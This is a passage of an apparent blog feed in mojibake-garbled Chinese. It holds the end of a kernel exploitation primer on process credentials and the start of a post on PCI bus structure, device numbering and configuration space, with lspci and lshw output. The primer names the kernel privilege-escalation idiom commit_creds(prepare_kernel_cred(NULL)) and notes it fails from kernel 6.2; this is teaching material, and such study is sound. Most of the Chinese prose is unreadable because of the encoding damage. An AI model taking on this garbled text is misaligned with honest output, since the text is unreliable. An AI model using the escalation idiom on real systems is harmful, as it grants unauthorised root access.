ç»“æ„ä½“ä¸­è®°è½½äº†ä¸€ä¸ªè¿›ç¨‹å››ç§ä¸åŒçš„ç”¨æˆ· IDï¼š</p><ul><li>çœŸå®ç”¨æˆ· IDï¼ˆreal UIDï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹å¯åŠ¨æ—¶çš„ç”¨æˆ· ID</li><li>ä¿å­˜ç”¨æˆ· IDï¼ˆsaved UIDï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹æœ€åˆçš„æœ‰æ•ˆç”¨æˆ· ID</li><li>æœ‰æ•ˆç”¨æˆ· IDï¼ˆeffective UIDï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹æ­£åœ¨è¿è¡Œæ—¶æ‰€å±çš„ç”¨æˆ· IDï¼Œä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œé€”ä¸­æ˜¯å¯ä»¥æ”¹å˜è‡ªå·±æ‰€å±ç”¨æˆ·çš„ï¼Œå› è€Œæƒé™æœºåˆ¶ä¹Ÿæ˜¯é€šè¿‡æœ‰æ•ˆç”¨æˆ· ID è¿›è¡Œè®¤è¯çš„ï¼Œå†…æ ¸é€šè¿‡ euid æ¥è¿›è¡Œç‰¹æƒåˆ¤æ–­ï¼›ä¸ºäº†é˜²æ­¢ç”¨æˆ·ä¸€ç›´ä½¿ç”¨é«˜æƒé™ï¼Œå½“ä»»åŠ¡å®Œæˆä¹‹åï¼Œeuid ä¼šä¸ suid è¿›è¡Œäº¤æ¢ï¼Œæ¢å¤è¿›ç¨‹çš„æœ‰æ•ˆæƒé™</li><li>æ–‡ä»¶ç³»ç»Ÿç”¨æˆ· IDï¼ˆUID for VFS opsï¼‰ï¼šæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºæ–‡ä»¶æ—¶è¿›è¡Œæ ‡è¯†çš„ç”¨æˆ· ID</li></ul><p>è¿™å‡ ä¸ªIDå¯ä»¥è¿™æ ·ç†è§£ï¼šå½“ä½ ä»¥ç”¨æˆ·æ€æ‰“å¼€ä¸€ä¸ªshellæ—¶ï¼Œ**çœŸå®ç”¨æˆ·ID(real UID)<strong>å³ä¸ºç™»å½•ç”¨æˆ·çš„IDï¼Œä¹‹åshellä¸­æƒ³ä»¥rootæƒé™åˆ é™¤ä¸€ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨sudo rmå‘½ä»¤ï¼Œè¿™æ—¶å€™</strong>æœ‰æ•ˆç”¨æˆ·ID(effective UID)<strong>ä¸ºrootç”¨æˆ·IDï¼Œè¿™æ—¶å€™çš„åˆ é™¤è¿›ç¨‹å®é™…ä¸Šæ˜¯æ™®é€šç”¨æˆ·åˆ›å»ºçš„ï¼Œä½†æ˜¯å…¶æ‹¥æœ‰rootç”¨æˆ·çš„æƒé™ã€‚ä½†æ˜¯å†…æ ¸ä¸ä¼šå…è®¸ä¸€ä¸ªè¿›ç¨‹ä¸€ç›´å æ®é«˜æƒé™ï¼Œå› æ­¤</strong>ä¿å­˜ç”¨æˆ·ID(saved UID)**å°†ä¿å­˜è¿›ç¨‹æœ€å¼€å§‹çš„eUIDï¼Œåœ¨ä¹‹åeuid ä¼šä¸ suid è¿›è¡Œäº¤æ¢ã€‚</p><p>ç”¨æˆ·ç»„ ID åŒæ ·åˆ†ä¸ºå››ä¸ªï¼šçœŸå®ç»„ IDã€ä¿å­˜ç»„ IDã€æœ‰æ•ˆç»„ IDã€æ–‡ä»¶ç³»ç»Ÿç»„ IDï¼Œä¸ç”¨æˆ· ID æ˜¯ç±»ä¼¼çš„ï¼Œè¿™é‡Œä¾¿ä¸å†èµ˜å™ã€‚</p><h2 id="è¿›ç¨‹æƒé™æ”¹å˜">è¿›ç¨‹æƒé™æ”¹å˜</h2><p>å‰é¢æˆ‘ä»¬è®²åˆ°ï¼Œä¸€ä¸ªè¿›ç¨‹çš„æƒé™æ˜¯ç”±ä½äºå†…æ ¸ç©ºé—´çš„ <code>cred</code> ç»“æ„ä½“è¿›è¡Œç®¡ç†çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼šåªè¦æ”¹å˜ä¸€ä¸ªè¿›ç¨‹çš„ <code>cred</code> ç»“æ„ä½“ï¼Œå°±èƒ½æ”¹å˜å…¶æ‰§è¡Œæƒé™ã€‚</p><p>åœ¨å†…æ ¸ç©ºé—´æœ‰å¦‚ä¸‹ä¸¤ä¸ªå‡½æ•°ï¼Œéƒ½ä½äº <code>kernel/cred.c</code> ä¸­ï¼š</p><ul><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>ï¼šè¯¥å‡½æ•°ç”¨ä»¥æ‹·è´ä¸€ä¸ªè¿›ç¨‹çš„ cred ç»“æ„ä½“ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–°çš„ cred ç»“æ„ä½“ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ daemon å‚æ•°åº”ä¸ºæœ‰æ•ˆçš„è¿›ç¨‹æè¿°ç¬¦åœ°å€ã€‚</li><li><code>int commit_creds(struct cred *new)</code>ï¼šè¯¥å‡½æ•°ç”¨ä»¥å°†ä¸€ä¸ªæ–°çš„ cred ç»“æ„ä½“åº”ç”¨åˆ°è¿›ç¨‹ã€‚</li></ul><p>åœ¨å†…æ ¸ç‰ˆæœ¬6.2ä»¥å‰ï¼Œ<code>prepare_kernel_cred()</code>å‡½æ•°å¦‚æœä¼ å…¥<code>NULL</code>ï¼Œè¯¥å‡½æ•°ä¼šæ‹·è´ <code>init_cred</code> å¹¶è¿”å›ä¸€ä¸ªæœ‰ç€ root æƒé™çš„ credï¼Œä¸éš¾æƒ³åˆ°ï¼Œå¦‚æœä½¿ç”¨<code>commit_creds(prepare_kernel_cred(NULL))</code>å°±å¯ä»¥ç›´æ¥å®Œæˆææƒçš„æ“ä½œã€‚ä¸è¿‡è‡ªä»å†…æ ¸ç‰ˆæœ¬ 6.2 èµ·ï¼Œ<code>prepare_kernel_cred(NULL)</code> å°†<strong>ä¸å†æ‹·è´ init_credï¼Œè€Œæ˜¯å°†å…¶è§†ä¸ºä¸€ä¸ªè¿è¡Œæ—¶é”™è¯¯å¹¶è¿”å› NULL</strong>ï¼Œè¿™ä½¿å¾—è¿™ç§ææƒæ–¹æ³•æ— æ³•å†åº”ç”¨äº 6.2 åŠæ›´é«˜ç‰ˆæœ¬çš„å†…æ ¸ã€‚</p><h1 id="Kernelå®‰å…¨æœºåˆ¶">Kernelå®‰å…¨æœºåˆ¶</h1><h1 id="å†…æ ¸æ¼æ´åˆ©ç”¨æ–¹å¼">å†…æ ¸æ¼æ´åˆ©ç”¨æ–¹å¼</h1><h1 id="Exploitç¼–è¯‘ä¸ä¼ è¾“">Exploitç¼–è¯‘ä¸ä¼ è¾“</h1><h1 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h1><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode">CTF Wiki</a></p><p><a href="https://arttnba3.cn/">arttnba3ä½¬çš„åšå®¢ï¼Œæ˜¯ç¬”è€…å¾ˆå´‡æ‹œçš„å¤§ä½¬</a></p><p><a href="https://cyr1s.vercel.app/">Cyr1sä½¬çš„åšå®¢</a></p><p><a href="https://blog.wohin.me/">Fernwehä½¬ï¼Œä¹Ÿæ˜¯ç¬”è€…å´‡æ‹œçš„å¤§ä½¬</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>kernel-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç®€å•äº†è§£PCIæ€»çº¿</title>
    <link href="/2025/07/09/%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3PCI%E6%80%BB%E7%BA%BF/"/>
    <url>/2025/07/09/%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3PCI%E6%80%BB%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<p>æ€ä¹ˆè¶Šæ¥è¶Šåº•å±‚äº†ï¼Ÿ</p><span id="more"></span><h1 id="å¼€å§‹ä¹‹å‰">å¼€å§‹ä¹‹å‰</h1><blockquote><p>ç”±äºéƒ¨åˆ†åŸå› ï¼Œç¬”è€…æœ€è¿‘éœ€è¦äº†è§£PCIæ€»çº¿ï¼Œä½†æ˜¯èº«è¾¹æ²¡æœ‰ç›¸å…³çš„èµ„æ–™ï¼Œå› æ­¤æœ¬æ–‡æœ‰å¾ˆå¤šä¸œè¥¿ä¼šå› ä¸ºç¬”è€…å¤ªèœçš„åŸå› ä¸€ç¬”å¸¦è¿‡ï¼Œå¸Œæœ›è¯»è€…è§è°…ã€‚</p><blockquote><p>å¦‚æœè¯»è€…éœ€è¦æ›´ä¸“ä¸šçš„çŸ¥è¯†è¯·å‚è€ƒ<a href="https://www.mindshare.com/Books/Titles/PCI_Express_Technology_3.0">ã€ŠPCI_Express_Technologyã€‹</a></p></blockquote></blockquote><h1 id="PCI-åŸºç¡€">PCI åŸºç¡€</h1><h2 id="æ€»çº¿ç»“æ„ç®€è¿°">æ€»çº¿ç»“æ„ç®€è¿°</h2><p>è®¡ç®—æœºä¸­çš„<strong>æ€»çº¿ï¼ˆBusï¼‰<strong>æ˜¯è®¡ç®—æœºå„ç§åŠŸèƒ½éƒ¨ä»¶ä¹‹é—´ä¼ é€ä¿¡æ¯çš„</strong>å…¬å…±é€šä¿¡å¹²çº¿</strong>ï¼ŒCPU åŠå„ç§è®¾å¤‡éƒ½é€šè¿‡è¿™è·Ÿæ€»çº¿è¿›è¡Œé€šä¿¡</p><p>æ€»çº¿æŒ‰åŠŸèƒ½å¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š</p><ul><li><strong>ç‰‡å†…æ€»çº¿</strong>ï¼šèŠ¯ç‰‡å†…çš„æ€»çº¿ï¼Œä½äº CPU å†…éƒ¨ï¼Œç”¨ä»¥åœ¨å¯„å­˜å™¨ä¸å¯„å­˜å™¨ã€å¯„å­˜å™¨ä¸ ALU ä¹‹é—´è¿›è¡Œæ•°æ®äº¤æ¢</li><li><strong>ç³»ç»Ÿæ€»çº¿</strong>ï¼šè®¡ç®—æœºç³»ç»Ÿå†…å„åŠŸèƒ½å•å…ƒï¼ˆCPUã€ä¸»å­˜ã€I/Oï¼‰ä¹‹é—´çš„å…¬å…±é€šä¿¡å¹²çº¿ï¼Œä¹Ÿç§°ä¹‹ä¸º <em>å†…æ€»çº¿</em></li><li><strong>é€šä¿¡æ€»çº¿</strong>ï¼šç”¨äºè®¡ç®—æœºç³»ç»Ÿä¹‹é—´æˆ–æ˜¯è®¡ç®—æœºç³»ç»Ÿä¸å…¶ä»–ç³»ç»Ÿï¼ˆä¾‹å¦‚è¿œç¨‹é€šä¿¡è®¾å¤‡ï¼‰ä¹‹é—´è¿›è¡Œé€šä¿¡çš„æ€»çº¿ï¼Œä¹Ÿç§°ä¹‹ä¸º <em>å¤–æ€»çº¿</em></li></ul><p>æ€»çº¿æ˜¯å¯ä»¥æ‰©å±•çš„ï¼Œå³å¯ä»¥å­˜åœ¨å¤šä¸ªä¸åŒç±»å‹çš„æ€»çº¿ç›¸è¿ï¼Œä¸åŒçš„è®¾å¤‡æ¥å…¥åˆ°ä¸åŒç±»å‹çš„æ€»çº¿ä¸Š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250625155025910.png" alt="image-20250625155025910"></p><h2 id="PCIæ¦‚å¿µç®€è¿°">PCIæ¦‚å¿µç®€è¿°</h2><p>PCIå…¨ç§°<strong>Peripheral Component Interconnect</strong>ï¼Œ<strong>å¤–å›´éƒ¨ä»¶äº’è¿</strong>ã€‚å…¶é€šè¿‡å¤šæ ¹ PCI bus å®Œæˆ CPU ä¸ å¤šä¸ª PCI è®¾å¤‡é—´çš„è¿æ¥ï¼Œï¼Œåœ¨ X86 ç¡¬ä»¶ä½“ç³»ç»“æ„ä¸­å‡ ä¹æ‰€æœ‰çš„è®¾å¤‡éƒ½ä»¥å„ç§å½¢å¼è¿æ¥åˆ° PCI è®¾å¤‡æ ‘ä¸Š</p><p><code>PCI express</code> æ˜¯æ–°ä¸€ä»£çš„æ€»çº¿æ ‡å‡†ï¼Œå®ƒæ²¿ç”¨æ—¢æœ‰çš„PCIç¼–ç¨‹æ¦‚å¿µåŠä¿¡å·æ ‡å‡†ï¼Œå¹¶ä¸”æ„å»ºäº†æ›´åŠ é«˜é€Ÿçš„ä¸²è¡Œé€šä¿¡ç³»ç»Ÿæ ‡å‡†</p><p>PCI æ€»çº¿ä¸»è¦è¢«åˆ†æˆä¸‰éƒ¨åˆ†ï¼š</p><ul><li><strong>PCI è®¾å¤‡</strong>ã€‚ç¬¦åˆ PCI æ€»çº¿æ ‡å‡†çš„è®¾å¤‡å°±è¢«ç§°ä¸º PCI è®¾å¤‡ï¼ŒPCI æ€»çº¿æ¶æ„ä¸­å¯ä»¥åŒ…å«å¤šä¸ª PCI è®¾å¤‡ã€‚å›¾ä¸­çš„ Audioã€LAN éƒ½æ˜¯ä¸€ä¸ª PCI è®¾å¤‡ã€‚PCI è®¾å¤‡åŒæ—¶ä¹Ÿåˆ†ä¸ºä¸»è®¾å¤‡å’Œç›®æ ‡è®¾å¤‡ä¸¤ç§ï¼Œä¸»è®¾å¤‡æ˜¯ä¸€æ¬¡è®¿é—®æ“ä½œçš„å‘èµ·è€…ï¼Œè€Œç›®æ ‡è®¾å¤‡åˆ™æ˜¯è¢«è®¿é—®è€…ã€‚</li><li><strong>PCI æ€»çº¿</strong>ã€‚PCI æ€»çº¿åœ¨ç³»ç»Ÿä¸­å¯ä»¥æœ‰å¤šæ¡ï¼Œç±»ä¼¼äºæ ‘çŠ¶ç»“æ„è¿›è¡Œæ‰©å±•ï¼Œæ¯æ¡ PCI æ€»çº¿éƒ½å¯ä»¥è¿æ¥å¤šä¸ª PCI è®¾å¤‡/æ¡¥ã€‚ä¸Šå›¾ä¸­æœ‰ä¸¤æ¡ PCI æ€»çº¿ã€‚</li><li><strong>PCI æ¡¥</strong>ã€‚å½“ä¸€æ¡ PCI æ€»çº¿çš„æ‰¿è½½é‡ä¸å¤Ÿæ—¶ï¼Œå¯ä»¥ç”¨æ–°çš„ PCI æ€»çº¿è¿›è¡Œæ‰©å±•ï¼Œè€Œ PCI æ¡¥åˆ™æ˜¯è¿æ¥ PCI æ€»çº¿ä¹‹é—´çš„çº½å¸¦ã€‚ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š<ul><li>HOST/PCI æ¡¥ï¼šä¹Ÿç§°ä¸º PCI ä¸»æ¡¥æˆ–è€… PCI æ€»çº¿æ§åˆ¶å™¨ï¼Œç”¨ä»¥è¿æ¥ CPU ä¸ PCI æ ¹æ€»çº¿ï¼Œ<strong>éš”ç¦»è®¾å¤‡åœ°å€ç©ºé—´ä¸å­˜å‚¨å™¨åœ°å€ç©ºé—´</strong>ï¼Œç°ä»£ PC é€šå¸¸è¿˜ä¼šåœ¨å…¶ä¸­é›†æˆå†…å­˜æ§åˆ¶å™¨ï¼Œç§°ä¹‹ä¸º<strong>åŒ—æ¡¥èŠ¯ç‰‡ç»„</strong>ï¼ˆNorth Bridge Chipsetï¼‰</li><li>PCI/ISA æ¡¥ï¼šç”¨äºè¿æ¥æ—§çš„ ISA æ€»çº¿ï¼Œé€šå¸¸è¿˜ä¼šé›†æˆä¸­æ–­æ§åˆ¶å™¨ï¼ˆå¦‚ i8359Aï¼‰ï¼Œç§°ä¹‹ä¸º<strong>å—æ¡¥èŠ¯ç‰‡ç»„</strong>ï¼ˆSouth Bridge Chipsetï¼‰</li><li>PCI-to-PCI æ¡¥ï¼šç”¨äºè¿æ¥ PCI ä¸»æ€»çº¿ï¼ˆPrimary Busï¼‰ä¸æ¬¡æ€»çº¿ï¼ˆSecondary Busï¼‰</li></ul></li></ul><p>PCIé‡‡ç”¨æ ‘å½¢æ‹“æ‰‘ç»“æ„ï¼Œä¸€ä¸ªå…¸å‹çš„ PCI æ ‘çŠ¶ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250708151634486.png" alt="image-20250708151634486"></p><p>ç”±æ­¤ï¼Œä¸€ä¸ªå¤šå±‚ PCI æ€»çº¿ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250708151952505.png" alt="image-20250708151952505"></p><p>åœ¨ Linux ä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>lspci</code> æŒ‡ä»¤æŸ¥çœ‹æ’åœ¨å½“å‰æœºå™¨çš„ PCI bus ä¸Šçš„ PCI è®¾å¤‡ï¼Œä½¿ç”¨ <code>-t</code> å‚æ•°æŸ¥çœ‹æ ‘å½¢ç»“æ„ï¼Œ<code>-v</code> å‚æ•°å¯ä»¥æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute1:~# lspci -t -v<br>-+-[0000:e0]-+-00.0  Chengdu Haiguang IC Design Co., Ltd. Root Complex<br> |           +-01.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Host Bridge<br> |           +-02.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Host Bridge<br> |           +-03.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Host Bridge<br> |           +-04.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Host Bridge<br> |           +-07.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Host Bridge<br> |           +-07.1-[e1]--+-00.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Function<br> |           |            \-00.2  Chengdu Haiguang IC Design Co., Ltd. PSPCCP Command DMA Processor<br> |           +-08.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Host Bridge<br> |           \-08.1-[e2]--+-00.0  Chengdu Haiguang IC Design Co., Ltd. PCIe Dummy Function<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ <code>lshw -businfo</code> å‘½ä»¤æ¥è·å–è®¾å¤‡ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute01:~# lshw -businfo<br>Bus info          Device        Class          Description<br>==========================================================<br>                                system         CS5280H2 (0)<br>                                bus            CS5280H2<br>                                memory         64KiB BIOS<br>cpu@0                           processor      Hygon C86-3G 7380 32-core Processor<br>                                memory         768KiB L1 cache<br>                                memory         4MiB L2 cache<br>                                memory         64MiB L3 cache<br>cpu@1                           processor      Hygon C86-3G 7380 32-core Processor<br>                                memory         768KiB L1 cache<br>                                memory         4MiB L2 cache<br>                                memory         64MiB L3 cache<br>                                memory         128GiB System Memory<br>                                memory         [empty]<br>                                memory         32GiB DIMM DDR4 Synchronous Registered (Buffered) 3200 MHz (0.3 ns)<br>                                memory         [empty]<br>                                memory         [empty]<br>                                memory         [empty]<br>                                memory         32GiB DIMM DDR4 Synchronous Registered (Buffered) 3200 MHz (0.3 ns)<br></code></pre></td></tr></table></figure><p>PCI è®¾å¤‡æ˜¯åœ¨å†…æ ¸å¯åŠ¨åˆå§‹åŒ–é˜¶æ®µè¿›è¡Œæšä¸¾çš„ï¼Œè¿™ä¸ªæ—¶å€™å¯èƒ½æœ‰çš„è®¾å¤‡è¿˜æ²¡å‡†å¤‡å¥½ï¼Œä»è€Œæ²¡è¢«æšä¸¾åˆ°ï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤é‡æ–°è¿›è¡Œè®¾å¤‡æšä¸¾ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /sys/bus/pci/rescan</span><br></code></pre></td></tr></table></figure><h2 id="è®¾å¤‡ç¼–å·">è®¾å¤‡ç¼–å·</h2><p>æ¯ä¸ªPCI è®¾å¤‡éƒ½æœ‰ç€ä¸‰ä¸ªç¼–å·ï¼š<strong>æ€»çº¿ç¼–å·ï¼ˆBus Numberï¼‰ã€è®¾å¤‡ç¼–å·ï¼ˆDevice Numberï¼‰ä¸åŠŸèƒ½ç¼–å·ï¼ˆFunction Numberï¼‰</strong>ï¼Œä½œä¸ºè®¾å¤‡çš„å”¯ä¸€æ ‡è¯†ï¼›åœ¨æ­¤ä¹‹ä¸Šè¿˜æœ‰ <strong>PCI åŸŸ</strong>çš„æ¦‚å¿µï¼Œä¸€ä¸ª PCI åŸŸä¸Šæœ€å¤šå¯ä»¥è¿æ¥ 256 æ ¹ PCI æ€»çº¿</p><p>å½“æˆ‘ä»¬ä½¿ç”¨ <code>lspci</code> å‘½ä»¤æŸ¥çœ‹ PCI è®¾å¤‡ä¿¡æ¯æ—¶ï¼Œåœ¨æ¯ä¸ªè®¾å¤‡å¼€å¤´éƒ½å¯ä»¥çœ‹åˆ°å½¢å¦‚ <code>xx:yy.z</code> çš„åå…­è¿›åˆ¶ç¼–å·ï¼Œè¿™ä¸ªæ ¼å¼å…¶å®æ˜¯ <code>æ€»çº¿ç¼–å·:è®¾å¤‡ç¼–å·.åŠŸèƒ½ç¼–å·</code>ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ <code>lspci -v </code>æŸ¥çœ‹ PCI è®¾å¤‡ä¿¡æ¯æ—¶ï¼Œåœ¨æ€»çº¿ç¼–å·å‰é¢çš„ 4 ä½æ•°å­—ä¾¿æ˜¯ PCI åŸŸçš„ç¼–å·</p><h1 id="PCIè®¾å¤‡é…ç½®ç©ºé—´">PCIè®¾å¤‡é…ç½®ç©ºé—´</h1><p>PCIEé…ç½®ç©ºé—´â€Œæ˜¯æ¯ä¸ªPCIeè®¾å¤‡çš„ä¸€æ®µç‹¬ç«‹ç©ºé—´ï¼Œç³»ç»Ÿé€šè¿‡è®¿é—®è¿™æ®µç©ºé—´å¯ä»¥è·å–è®¾å¤‡çš„ä¿¡æ¯å¹¶è¿›è¡Œé…ç½®ã€‚é…ç½®ç©ºé—´çš„ç»“æ„åŒ…æ‹¬<strong>å¤´æ ‡åŒº</strong>å’Œ<strong>è®¾å¤‡ç›¸å…³åŒº</strong>ï¼Œ<strong>é…ç½®å¤´é•¿åº¦ä¸º64å­—èŠ‚ï¼ŒåŒ…å«ç”¨äºå”¯ä¸€è¯†åˆ«è®¾å¤‡çš„å­—æ®µ</strong>ï¼›å‰©ä½™çš„å­—èŠ‚åˆ™å› è®¾å¤‡è€Œå¼‚ï¼Œç”¨äºæè¿°è®¾å¤‡çš„ç‰¹å®šåŠŸèƒ½â€Œã€‚</p><p><strong>PCIè®¾å¤‡é…ç½®ç©ºé—´ä¸º256å­—èŠ‚ï¼ŒPCIEè®¾å¤‡çš„é…ç½®ç©ºé—´ä¸º4Kå­—èŠ‚ï¼Œä¸¤ç§è®¾å¤‡é…ç½®å¤´å‡ä¸º64å­—èŠ‚</strong>ï¼Œä½†ç”±äºPCIEè®¾å¤‡çš„åŠŸèƒ½æ›´å¼ºå¤§ï¼Œéœ€è¦æ›´å¤šæ‰©å±•ç©ºé—´æ¥æè¿°å…¶ç‰¹å®šåŠŸèƒ½â€Œï¼Œåˆä¸ºäº†å…¼å®¹PCIï¼ŒPCIEæ‰©å±•äº†åœ°å€0x100~0xfffç”¨äºPCIEæ‰©å±•é…ç½®ç©ºé—´ã€‚</p><p>åœ¨æ¯æ¬¡å¯åŠ¨æ—¶ï¼ŒPCIeè®¾å¤‡çš„é…ç½®ç©ºé—´åœ°å€ä¸€èˆ¬æœ‰BOISåˆ†é…ï¼Œåˆ†é…å®Œæˆåä¸»è®¾å¤‡ç³»ç»Ÿå¯åŠ¨åå¯æ‰«æPCIeè®¾å¤‡çš„é…ç½®ç©ºé—´ï¼Œè·å–PCIeè®¾å¤‡å¹¶å®ŒæˆPCIEç›¸å…³é…ç½®ã€‚</p><p>PCIåŠPCIEé…ç½®ç©ºé—´åˆ†é…å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250710203458864.png" alt="image-20250710203458864"></p><h2 id="PCIEé…ç½®å¤´">PCIEé…ç½®å¤´</h2><p>PCIE 64å­—èŠ‚çš„é…ç½®å¤´åˆ†ä¸ºä¸¤ç§ï¼ŒType0å’ŒType1ï¼ŒType0ç”¨äºæè¿°PCIE Endpointï¼ŒType1ç”¨äºæè¿°PCIE Bridgeæˆ–è€…Switchã€‚</p><p>Agent ç±»å‹é…ç½®ç©ºé—´åˆè¢«ç§°ä¸º <code>Type 00h</code>ï¼Œæ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250710202242452.png" alt="image-20250710202242452"></p><p>Bridge ç±»å‹é…ç½®ç©ºé—´è¢«ç§°ä¸º <code>Type 01h</code>ï¼Œä¸ Agent ç±»å‹é…ç½®ç©ºé—´å¤§åŒå°å¼‚ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250710204925936.png" alt="image-20250710204925936"></p><p>ç®€å•ä»‹ç»å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µï¼š</p><ul><li><p>è®¾å¤‡æ ‡è¯†ç›¸å…³ï¼š</p><ul><li><code>Vendor ID</code>ï¼šç”Ÿäº§å‚å•†çš„ IDï¼Œä¾‹å¦‚ Intel è®¾å¤‡é€šå¸¸ä¸º <code>0x8086</code></li><li><code>Device ID</code>ï¼šå…·ä½“è®¾å¤‡çš„ IDï¼Œé€šå¸¸ä¹Ÿæ˜¯ç”±å‚å®¶è‡ªè¡ŒæŒ‡å®šçš„</li><li><code>Class Code</code>ï¼šç±»ä»£ç ï¼Œç”¨äºåŒºåˆ†è®¾å¤‡ç±»å‹</li><li><code>Revision ID</code>ï¼šPCI è®¾å¤‡çš„ç‰ˆæœ¬å·ï¼Œå¯ä»¥çœ‹ä½œ Device ID çš„æ‰©å±•</li></ul></li><li><p>è®¾å¤‡çŠ¶æ€ç›¸å…³ï¼š</p><ul><li><p><code>Status</code>ï¼šè®¾å¤‡çš„çŠ¶æ€å­—å¯„å­˜å™¨ï¼Œå„ bit å«ä¹‰å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250710205003820.png" alt="image-20250710205003820"></p></li><li><p><code>Command</code>ï¼šè®¾å¤‡çš„çŠ¶æ€å­—å¯„å­˜å™¨ï¼Œå„ bit å«ä¹‰å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250710205028241.png" alt="image-20250710205028241"></p></li></ul></li><li><p>è®¾å¤‡é…ç½®ç›¸å…³ï¼š</p><ul><li><code>Base Address Registers</code>ï¼šå†³å®šäº† PCI è®¾å¤‡ç©ºé—´æ˜ å°„åˆ°ç³»ç»Ÿç©ºé—´çš„å…·ä½“ä½ç½®ï¼Œæœ‰ä¸¤ç§æ˜ å°„æ–¹å¼ï¼šMMIO ä¸ PMIOï¼Œæ˜ å°„æ–¹å¼ç”±æœ€ä½ä½å†³å®šï¼Œä¸å¯æ›´æ”¹</li><li><code>Interrupt Pin</code>ï¼šä¸­æ–­å¼•è„šï¼Œè¯¥å¯„å­˜å™¨è¡¨ç¤ºè®¾å¤‡æ‰€è¿æ¥çš„å¼•è„š</li><li><code>Interrupt Line</code>ï¼šä¸­æ–­ç¼–å·</li></ul></li></ul><p>å‰é¢æˆ‘ä»¬è®²åˆ° lspci å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>-s</code> æ¥é€šè¿‡æŒ‡å®šæŸ¥çœ‹çš„å…·ä½“ PCI è®¾å¤‡ï¼Œé€šè¿‡ <code>-m</code> æŸ¥çœ‹éƒ¨åˆ†ä¿¡æ¯ï¼Œé€šè¿‡ <code>-nn</code> æŸ¥çœ‹æ¯”è¾ƒè¯¦ç»†çš„ä¿¡æ¯:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@compute01:~# lspci -vv -s e2:00.1 -m<br>Device: e2:00.1<br>Class:  Encryption controller<br>Vendor: Chengdu Haiguang IC Design Co., Ltd.<br>Device: NTBCCP<br>SVendor:        